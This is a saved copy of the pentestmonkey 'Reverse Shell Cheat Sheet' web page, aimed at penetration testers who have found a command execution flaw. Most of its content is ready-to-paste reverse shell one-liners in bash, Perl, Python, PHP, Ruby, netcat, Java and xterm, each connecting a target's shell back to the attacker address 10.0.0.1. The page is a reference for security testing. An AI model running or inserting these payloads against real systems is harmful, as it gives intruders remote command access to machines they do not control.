<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0069)http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet -->
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US" xml:lang="en-US"><head profile="http://gmpg.org/xfn/11"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Reverse Shell Cheat Sheet | pentestmonkey</title>
<link rel="stylesheet" href="./Reverse Shell Cheat Sheet _ pentestmonkey_files/style.css" type="text/css" media="screen">
<link rel="pingback" href="http://pentestmonkey.net/xmlrpc.php">
<link rel="alternate" type="application/rss+xml" title="pentestmonkey » Feed" href="http://pentestmonkey.net/feed">
<link rel="alternate" type="application/rss+xml" title="pentestmonkey » Comments Feed" href="http://pentestmonkey.net/comments/feed">
<script type="text/javascript" src="./Reverse Shell Cheat Sheet _ pentestmonkey_files/l10n.js"></script>
<script type="text/javascript" src="./Reverse Shell Cheat Sheet _ pentestmonkey_files/jquery.js"></script>
<script type="text/javascript" src="./Reverse Shell Cheat Sheet _ pentestmonkey_files/jquery.ddmenu.js"></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://pentestmonkey.net/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://pentestmonkey.net/wp-includes/wlwmanifest.xml"> 
<link rel="index" title="pentestmonkey" href="http://pentestmonkey.net/">
<link rel="start" title="A Penetration Testing Site" href="http://pentestmonkey.net/site-news/a-penetration-testing-site">
<link rel="prev" title="“Hackers for Charity” Needs You" href="http://pentestmonkey.net/blog/hackers-for-charity-needs-you">
<link rel="next" title="Post-Exploitation in Windows: From Local Admin To Domain Admin (efficiently)" href="http://pentestmonkey.net/uncategorized/from-local-admin-to-domain-admin">
<meta name="generator" content="WordPress 3.2.1">
<link rel="canonical" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">
<link rel="shortlink" href="http://pentestmonkey.net/?p=175">
<!--[if lte IE 7]><link href="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/ie.css" rel="stylesheet" media="screen" type="text/css" /><![endif]-->	
<!--[if IE 6]><script src="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/js/DD_belatedPNG.js"></script><![endif]-->
</head>
<body class="single single-post postid-175 single-format-standard">
	<div class="all-page">
		
		<div class="container">
			
			<!-- HEADER -->
			<div id="header">
			    <div class="website-name"><a href="http://pentestmonkey.net/">pentestmonkey</a></div>
				<div class="slogan">Taking the monkey work out of pentesting</div>
			</div>
			<!-- /HEADER -->

			<!-- main NAVIGATION -->
			<div id="mainNav">
				<div class="wrap">
    <div class="menu-cheat-sheets-container"><ul id="menu-cheat-sheets" class="menu"><li id="menu-item-133" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-133"><a href="http://pentestmonkey.net/category/site-news"><span>Site News</span></a></li>
<li id="menu-item-130" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-130"><a href="http://pentestmonkey.net/category/blog"><span>Blog</span></a></li>
<li id="menu-item-136" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-136"><a href="http://pentestmonkey.net/category/tools"><span>Tools</span></a></li>
<li id="menu-item-137" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-137"><a href="http://pentestmonkey.net/category/yaptest"><span>Yaptest</span></a></li>
<li id="menu-item-134" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-134"><a href="http://pentestmonkey.net/category/cheat-sheet"><span>Cheat Sheets</span></a></li>
<li id="menu-item-135" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-135"><a href="http://pentestmonkey.net/category/contact"><span>Contact</span></a></li>
</ul></div>				</div>
			</div>
			<!-- /main NAVIGATION -->
			<div class="clear"></div>


			<!-- CONTENT -->
			<div id="content">

	<!-- Start: Left Panel -->
	<div class="content">

	
		<div class="post-175 post type-post status-publish format-standard hentry category-shells tag-bash tag-cheatsheet tag-netcat tag-pentest tag-perl tag-php tag-python tag-reverseshell tag-ruby tag-xterm" id="post-175">
			<h1>Reverse Shell Cheat Sheet</h1>

			<div class="entryContent">
				<p>If you’re lucky enough to find a command execution&nbsp;vulnerability&nbsp;during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.</p>
<p>If it’s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port. &nbsp;This page deals with the former.</p>
<p>Your options for creating a reverse shell are limited by the scripting languages installed on the target system – though you could probably upload a binary program too if you’re suitably well prepared.</p>
<p>The examples shown are tailored to Unix-like systems. &nbsp;Some of the examples below should also work on Windows if you use substitute “/bin/sh -i” with “cmd.exe”.</p>
<p>Each of the methods below is aimed to be a one-liner that you can copy/paste. &nbsp;As such they’re quite short lines, but not very readable.</p>
<h3>Bash</h3>
<p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
<pre>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</pre>
<h3>PERL</h3>
<p>Here’s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a>:</p>
<pre>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</pre>
<p>There’s also an&nbsp;<a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here</a>.</p>
<h3>Python</h3>
<p>This was tested under Linux / Python 2.7:</p>
<pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<h3>PHP</h3>
<p>This code assumes that the TCP connection uses file descriptor 3. &nbsp;This worked on my test system. &nbsp;If it doesn’t work, try 4, 5, 6…</p>
<pre>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
<p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a>.</p>
<h3>Ruby</h3>
<pre>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
<h3>Netcat</h3>
<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p>
<pre>nc -e /bin/sh 10.0.0.1 1234</pre>
<p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
<pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre>
<h3>Java</h3>
<pre>r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()</pre>
<p>[Untested submission from anonymous reader]</p>
<h3>xterm</h3>
<p>One of the simplest forms of reverse shell is an xterm session. &nbsp;The following command should be run on the server. &nbsp;It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<pre>xterm -display 10.0.0.1:1</pre>
<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). &nbsp;One way to do this is with Xnest (to be run on your system):</p>
<pre>Xnest :1</pre>
<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
<pre>xhost +targetip</pre>
<h3>Further Reading</h3>
<p>Also check out <a href="http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html">Bernardo’s Reverse Shell One-Liners</a>. &nbsp;He has some alternative approaches and doesn’t rely on /bin/sh for his Ruby reverse shell.</p>
<p>There’s a <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387">reverse shell written in gawk over here</a>. &nbsp;Gawk is not something that I’ve ever used myself. &nbsp;However, it seems to get installed by default quite often, so is exactly the sort of language pentesters might want to use for reverse shells.</p>
                <div class="clear"></div>
								<p>Tags: <a href="http://pentestmonkey.net/tag/bash" rel="tag">bash</a>, <a href="http://pentestmonkey.net/tag/cheatsheet" rel="tag">cheatsheet</a>, <a href="http://pentestmonkey.net/tag/netcat" rel="tag">netcat</a>, <a href="http://pentestmonkey.net/tag/pentest" rel="tag">pentest</a>, <a href="http://pentestmonkey.net/tag/perl" rel="tag">perl</a>, <a href="http://pentestmonkey.net/tag/php" rel="tag">php</a>, <a href="http://pentestmonkey.net/tag/python" rel="tag">python</a>, <a href="http://pentestmonkey.net/tag/reverseshell" rel="tag">reverseshell</a>, <a href="http://pentestmonkey.net/tag/ruby" rel="tag">ruby</a>, <a href="http://pentestmonkey.net/tag/xterm" rel="tag">xterm</a></p>				<p>Posted in <a href="http://pentestmonkey.net/category/cheat-sheet/shells" title="View all posts in Shells" rel="category tag">Shells</a></p>
				
			</div>
		</div>

	
<!-- You can start editing here. -->


			<!-- If comments are closed. -->
	
<p></p>
<br>





	
	</div>
				<!-- sidebar -->
				<div class="sideBar">
					
					<div class="nav">
						<div class="bFrameT"><i></i></div>
	<form method="get" id="searchform" action="http://pentestmonkey.net/" class="searchForm">
	<p><input type="text" value="" name="s" id="s" class="field">
	<input type="image" src="./Reverse Shell Cheat Sheet _ pentestmonkey_files/search.gif" alt="" title="Search" id="searchsubmit" class="btn"></p>
</form>
<h3><span>Categories</span></h3>		<ul>
	<li class="cat-item cat-item-5"><a href="http://pentestmonkey.net/category/blog" title="View all posts filed under Blog">Blog</a> (78)
</li>
	<li class="cat-item cat-item-39"><a href="http://pentestmonkey.net/category/cheat-sheet" title="View all posts filed under Cheat Sheets">Cheat Sheets</a> (10)
<ul class="children">
	<li class="cat-item cat-item-40"><a href="http://pentestmonkey.net/category/cheat-sheet/shells" title="View all posts filed under Shells">Shells</a> (1)
</li>
	<li class="cat-item cat-item-8"><a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" title="View all posts filed under SQL Injection">SQL Injection</a> (7)
</li>
</ul>
</li>
	<li class="cat-item cat-item-7"><a href="http://pentestmonkey.net/category/contact" title="View all posts filed under Contact">Contact</a> (2)
</li>
	<li class="cat-item cat-item-3"><a href="http://pentestmonkey.net/category/site-news" title="View all posts filed under Site News">Site News</a> (3)
</li>
	<li class="cat-item cat-item-4"><a href="http://pentestmonkey.net/category/tools" title="View all posts filed under Tools">Tools</a> (17)
<ul class="children">
	<li class="cat-item cat-item-14"><a href="http://pentestmonkey.net/category/tools/audit" title="View all posts filed under Audit">Audit</a> (3)
</li>
	<li class="cat-item cat-item-16"><a href="http://pentestmonkey.net/category/tools/misc" title="View all posts filed under Misc">Misc</a> (7)
</li>
	<li class="cat-item cat-item-13"><a href="http://pentestmonkey.net/category/tools/user-enumeration" title="View all posts filed under User Enumeration">User Enumeration</a> (4)
</li>
	<li class="cat-item cat-item-15"><a href="http://pentestmonkey.net/category/tools/web-shells" title="View all posts filed under Web Shells">Web Shells</a> (3)
</li>
</ul>
</li>
	<li class="cat-item cat-item-1"><a href="http://pentestmonkey.net/category/uncategorized" title="View all posts filed under Uncategorized">Uncategorized</a> (3)
</li>
	<li class="cat-item cat-item-6"><a href="http://pentestmonkey.net/category/yaptest" title="View all posts filed under Yaptest">Yaptest</a> (15)
<ul class="children">
	<li class="cat-item cat-item-12"><a href="http://pentestmonkey.net/category/yaptest/front-end" title="View all posts filed under Front End">Front End</a> (1)
</li>
	<li class="cat-item cat-item-9"><a href="http://pentestmonkey.net/category/yaptest/installing" title="View all posts filed under Installing">Installing</a> (2)
</li>
	<li class="cat-item cat-item-11"><a href="http://pentestmonkey.net/category/yaptest/overview" title="View all posts filed under Overview">Overview</a> (2)
</li>
	<li class="cat-item cat-item-10"><a href="http://pentestmonkey.net/category/yaptest/using" title="View all posts filed under Using">Using</a> (8)
</li>
</ul>
</li>
		</ul>
<h3><span> <a href="http://pentestmonkey.net/rss/" class="mainlevel-nav" rel="alternate" type="application/rss+xml"><img src="./Reverse Shell Cheat Sheet _ pentestmonkey_files/feed-icon16x16.png" alt="" style="vertical-align:middle;border:0"></a>&nbsp;<a href="http://pentestmonkey.net/rss/" class="mainlevel-nav" rel="alternate" type="application/rss+xml">RSS Feed</a><p></p> <link rel="alternate" type="application/rss+xml" title="Pentestmonkey RSS Feed" href="http://pentestmonkey.net/rss/"> </span></h3>
			
						<div class="bFrameB"><i></i></div>
					</div>
					
				</div>
				<!-- /sidebar -->
	
				</div>
				<!-- /content -->
				
			</div>
			<!-- /CONTENT -->	
			
		
		<!-- bottom NAVIGATION -->
		<div id="bottomNav">
		</div>
		<!-- /bottom NAVIGATION -->
		
		<!-- FOOTER -->
		<div id="footer">
         <div class="menu"></div>
			
			
		</div>
		<!-- /FOOTER -->
	</div>
		


<script src="./Reverse Shell Cheat Sheet _ pentestmonkey_files/urchin.js" type="text/javascript">
</script>
<script type="text/javascript">
_uacct = "UA-2082472-1";
urchinTracker();
</script>



</body></html>